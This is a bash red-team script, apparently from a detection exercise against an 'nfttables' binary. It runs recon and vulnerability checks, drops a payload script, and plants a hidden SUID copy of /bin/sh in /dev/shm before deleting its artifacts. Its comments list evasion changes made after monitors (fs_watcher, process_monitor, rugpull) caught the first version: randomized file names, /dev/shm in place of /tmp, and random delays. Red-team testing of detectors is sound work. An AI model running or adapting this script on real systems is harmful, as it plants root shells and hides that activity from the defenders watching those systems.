#!/bin/bash
# Red team payload runner v2 - post iteration 1 evasion patches.
#
# Changes from v1:
# - Randomized temp file names (fs_watcher caught .nft_* pattern)
# - Delays between spray-like operations (process_monitor caught pipe burst)
# - Use /dev/shm instead of /tmp (fs_watcher focused on /tmp)
# - Smaller operation windows

REPORT_DIR="${1:-.}"
BINARY="/opt/nfttables/nfttables"

# Randomized artifact names
RAND=$(cat /proc/sys/kernel/random/uuid | cut -c1-8)
PAYLOAD_SCRIPT="/dev/shm/.x${RAND}"
TRIGGER_BIN="/dev/shm/.t${RAND}"
SHELL_BIN="/dev/shm/.s${RAND}"

echo "[red] Starting payload execution (v2 - evasion patches)"
echo "[red] Binary: $BINARY"
echo "[red] Artifact prefix: $RAND"

# Phase 1: Recon (quieter - no verbose flag)
echo "[red] === Phase 1: Recon ==="
$BINARY info 2>&1 | tee "$REPORT_DIR/red_info.log"
# Skip verbose scan to reduce observable time
$BINARY scan 2>&1 | tee "$REPORT_DIR/red_scan.log"

# Phase 2: Vulnerability check with timing spread
echo "[red] === Phase 2: Checks ==="
$BINARY check 1086 2>&1 | tee "$REPORT_DIR/red_1086.log"
# Random delay between checks to avoid burst pattern
sleep $(( RANDOM % 3 + 1 ))
$BINARY check 32233 2>&1 | tee "$REPORT_DIR/red_32233.log"

# Phase 3: Simulated artifacts with evasion
echo "[red] === Phase 3: Simulated Artifacts (evaded) ==="

# Use /dev/shm instead of /tmp, randomized names
cat > "$PAYLOAD_SCRIPT" << PAYLOAD
#!/bin/sh
cp /bin/sh $SHELL_BIN
chmod u+s $SHELL_BIN
PAYLOAD
chmod +x "$PAYLOAD_SCRIPT"
echo "[red] Created payload: $PAYLOAD_SCRIPT"

# Trigger with random magic (not the obvious deadbeef)
head -c 4 /dev/urandom > "$TRIGGER_BIN"
chmod +x "$TRIGGER_BIN"
echo "[red] Created trigger: $TRIGGER_BIN"

# SUID shell
cp /bin/sh "$SHELL_BIN"
chmod u+s "$SHELL_BIN"
echo "[red] Created shell: $SHELL_BIN"

sleep 3

# Phase 4: Cleanup (manual, since rugpull looks for hardcoded names)
echo "[red] === Phase 4: Cleanup ==="
rm -f "$PAYLOAD_SCRIPT" "$TRIGGER_BIN" "$SHELL_BIN"
echo "[red] Cleaned up artifacts"

echo "[red] Payload execution complete (v2)"
